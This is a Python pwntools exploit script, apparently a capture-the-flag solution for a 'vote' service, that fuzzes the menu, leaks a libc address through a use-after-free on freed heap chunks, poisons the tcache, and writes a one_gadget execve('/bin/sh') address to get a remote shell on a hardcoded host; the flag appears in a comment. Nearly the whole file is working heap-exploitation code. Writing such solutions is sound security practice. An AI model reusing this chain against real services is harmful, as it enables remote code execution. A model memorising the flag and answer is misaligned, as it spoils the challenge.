#!/usr/bin/env python3
from contextlib import contextmanager

from pwn import *

PROMPT = b'> '
TOLOWER_GOT = 0x418110


def connect():
    if args.LOCAL:
        return gdb.debug(['./vote.dbg'], api=True)
    else:
        return remote('69.90.132.248', 3371)


def prompt(tube):
    tube.recvuntil(PROMPT)


def view_results(tube):
    prompt(tube)
    tube.sendline(b'1')


def view_statistics(tube):
    prompt(tube)
    tube.sendline(b'2')


def delete_metadata(tube, id):
    prompt(tube)
    tube.sendline(b'3')
    tube.recvuntil(b'ID: ')
    tube.sendline(id)


def update_gender(tube, id, gender):
    prompt(tube)
    tube.sendline(b'4')
    tube.recvuntil(b'ID: ')
    tube.sendline(id)
    tmp = tube.recvuntil((b'Old gender: ', PROMPT))
    if tmp.endswith(PROMPT):
        tube.unrecv(PROMPT)
        return None
    gender_prompt = b'What is your gender?\n'
    old_gender = tube.recvuntil(gender_prompt)[:-len(gender_prompt)]
    if callable(gender):
        gender = gender(old_gender)
    tube.sendline(gender)
    return old_gender


def vote(tube, employed, age, gender, state, candidate, win=False):
    prompt(tube)
    tube.sendline(b'5')
    tube.recvuntil(b'Are you employed (y/n)?\n')
    tube.sendline(employed)
    tube.recvuntil(b'What is your age?\n')
    tube.sendline(age)
    tube.recvuntil(b'What is your gender?\n')
    tube.sendline(gender)
    if win:
        tube.interactive()
    tube.recvuntil(b'In which state do you live?\n')
    tube.sendline(state)
    tube.recvuntil(b'For which candidate do you vote?\n')
    tube.sendline(candidate)
    tube.recvuntil(b'Your vote ID is ')
    vote = tube.recvline()
    assert vote.startswith(b'0x')
    assert vote.endswith(b'.\n')
    return int(vote[:-2], 16)


def gen_str(str_pool):
    if len(str_pool) == 0 or random.randint(0, 1) == 0:
        new_len = random.randint(0, 100)
        new_str = random.choices(string.ascii_letters, k=new_len)
        return ''.join(new_str).encode()
    else:
        return random.choice(str_pool)


def fuzz_1(tube, plan):
    ids = []
    str_pool = []
    while True:
        choice = random.randint(1, 5)
        if choice == 1:
            view_results(tube)
            plan.append('view_results(tube)')
        elif choice == 2:
            view_statistics(tube)
            plan.append('view_statistics(tube)')
        elif choice == 3:
            if len(ids) == 0 or random.randint(0, 1) == 0:
                id = hex(random.randint(-1000, 1000))
            else:
                id = random.choice(ids)
            delete_metadata(tube, id)
            plan.append(f'delete_metadata(tube, {id!r})')
        elif choice == 4:
            if len(ids) == 0 or random.randint(0, 1) == 0:
                id = hex(random.randint(-1000, 1000))
            else:
                id = random.choice(ids)
            gender = gen_str(str_pool)
            update_gender(tube, id, gender)
            plan.append(f'update_gender(tube, {id!r}, {gender!r})')
        elif choice == 5:
            employed = gen_str(str_pool)
            age = str(randint(-1000, 1000))
            gender = gen_str(str_pool)
            state = gen_str(str_pool)
            candidate = gen_str(str_pool)
            ids.append(hex(vote(
                tube=tube,
                employed=employed,
                age=age,
                gender=gender,
                state=state,
                candidate=candidate,
            )))
            plan.append(f'vote(tube, {employed!r}, {age!r}, {gender!r}, {state!r}, {candidate!r})')
        else:
            raise Exception('wtf')


def fuzz(tube):
    plan = []
    try:
        fuzz_1(tube, plan)
    except:
        print('def crash(tube):')
        for entry in plan:
            print('    ' + entry)
        raise


def crash(tube):
    id = hex(vote(tube, b'frCFWcEcWdL', '-83', b'JFcWIKBNnOkaiXmuILhAq', b'EmvZr', b'PdmJlzZUpFtRNyPvLzGWxmDUKphfKEmKARFQJNAgptLtIatIAL'))
    delete_metadata(tube, id)
    update_gender(tube, id, b'uNnzGwxdTbnhIWbqHnnbezVgBafAHUiXfAZSbzARjieWLAaAAXhOK')
    vote(tube, b'rRzMgQAKhNRHN', '-66', b'KmUJQwOfsuxWqSImNXRktfLFgxLptMQHvwhPEnTlcstelYKAAxHUObyfHalZwhDsnwQrxtzJhgJsfbGPPuIRzLzKqahd',
         b'WWykfTlSnXHqAMrZMNZKDUTihOYzkSDVuhVhogsBthcReZdaghfDioSuJuRuQVcTIKOPRrsONKAVygZcGPEHSTUsJa', b'ERknxhoTKssahFqGTsH')
    delete_metadata(tube, '-0x86')
    vote(tube, b'YBJtHOvyfIPHUOYUDTVwBNtllGmHWB', '163', b'BN', b'yCpjwChJLrxxkfStHdGlAUyrdKHBaISjmgpOVLzxqnGeEEgEEsYeuOMrdPWSjfLp', b'GmUTfIMpEcQAOk')


@contextmanager
def trace_delete_metadata(tube):
    if args.LOCAL:
        tube.gdb.interrupt_and_wait()
        bp = tube.gdb.Breakpoint('free')
        tube.gdb.continue_nowait()
    yield
    if args.LOCAL:
        # delete_metadata() will free 3 strings: gender, state and candidate.
        freed_ptrs = []
        for i in range(3):
            tube.gdb.wait()
            freed_ptr = tube.gdb.parse_and_eval('$rdi') \
                .cast(tube.gdb.lookup_type('long'))
            freed_ptrs.append(int(freed_ptr))
            print(f'free: {freed_ptr}')
            if i == 2:
                bp.delete()
            tube.gdb.continue_nowait()


def leak_libc(tube):
    victim_id = vote(
        tube,
        employed=b'Are you employed, sir?'.ljust(128, b'A'),
        age=b'49',
        gender=b'Employed?'.ljust(1024, b'A'),  # unsorted bin
        state=b'You don\'t go out looking for a job dressed like that? On a weekday?'.ljust(128, b'A'),
        candidate=b'Is this a... what day is this?'.ljust(128, b'A'),
    )
    with trace_delete_metadata(tube):
        delete_metadata(tube, hex(victim_id))

    libc = 0
    corrupted = False

    def convert_gender(old_gender):
        fwd, bk = struct.unpack('<QQ', old_gender[:16])
        nonlocal libc
        libc = fwd - 0x3ebca0
        answer = struct.pack('<QQ', fwd, bk)
        if answer.lower() != answer:
            nonlocal corrupted
            corrupted = True
        return answer

    update_gender(tube, hex(victim_id), convert_gender)
    return libc, corrupted


def try_pwn(tube):
    if args.LOCAL:
        tube.gdb.continue_nowait()
    # fuzz(tube)
    # crash(tube)
    libc, corrupted = leak_libc(tube)
    print(f'libc = 0x{libc:x}')
    assert libc & 0xfff == 0
    if corrupted:
        print('Corrupted heap while leaking libc@, trying again...')
        return False

    victim_id = vote(
        tube,
        employed=b'Your revolution is over, Mr. Lebowski. Condolences. The bums lost.',
        age=b'68',
        gender=b'My advice is to do what your parents did; get a job, sir.'.ljust(196, b'A'),  # tcache[size=0x100]
        state=b'The bums will always lose. Do you hear me, Lebowski?',
        candidate=b'The bums will always lose!',
    )
    with trace_delete_metadata(tube):
        delete_metadata(tube, hex(victim_id))

    def convert_gender(old_gender):
        _, tcache_magic = struct.unpack('<QQ', old_gender[:16])
        answer = struct.pack('<QQ', libc + 0x3ed8e8, tcache_magic)
        if answer.lower() != answer:
            nonlocal corrupted
            corrupted = True
        return answer

    update_gender(tube, hex(victim_id), convert_gender)
    if corrupted:
        print('Corrupted heap while poisoning tcache, trying again...')
        return False

    vote(
        tube,
        employed=b'Smokey, my friend, you are entering a world of pain.',
        age=b'53',
        gender=b'Walter...'.ljust(128, b'A'),  # tcache[size=0x100]
        state=b'You mark that frame an 8, and you\'re entering a world of pain.',
        candidate=b'I\'m not...',
    )

    '''
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

    vote(
        tube,
        employed=b'Let me tell you something, pendejo.',
        age=b'41',
        gender=(struct.pack('<Q', libc + 0x10a41c) + b'You pull any of your crazy shit with us,').ljust(128, b'A'),  # tcache[size=0x100]
        state=b'you flash a piece out on the lanes, I\'ll take it away from you',
        candidate=b'stick it up your ass and pull the fucking trigger \'til it goes "click."',
        win=True,
    )

    # ASIS{v0t3_vEc7Or_Nev3R_93T_uPd4t3D!!}

    return True


def main():
    while True:
        with connect() as tube:
            if try_pwn(tube):
                tube.interactive()
                break


if __name__ == '__main__':
    main()
